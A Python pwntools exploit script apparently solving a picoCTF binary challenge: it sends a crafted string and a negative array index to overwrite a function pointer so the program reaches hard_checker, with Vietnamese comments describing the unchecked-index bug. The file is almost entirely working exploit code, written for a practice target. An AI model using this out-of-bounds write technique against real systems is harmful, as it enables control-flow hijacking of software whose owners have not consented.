#!/usr/bin/env python3
from pwn import *

PORT =  61500
HOST = "saturn.picoctf.net"

exe = context.binary = ELF('./vuln', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*0x80495b2
        	b*hard_checker+41
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

GDB()

pl = b"zzzbaaaaaaaaa"

p.sendlineafter(b"1337 >> ", pl) # 314
p.sendlineafter(b"10.\n", b"-16 -314")

p.interactive()

# vuln: Nhap toi da 127 bytes vao story. if(num1 < 10)fun[num1] += num2
# check -> hard_checker
# 0x804c000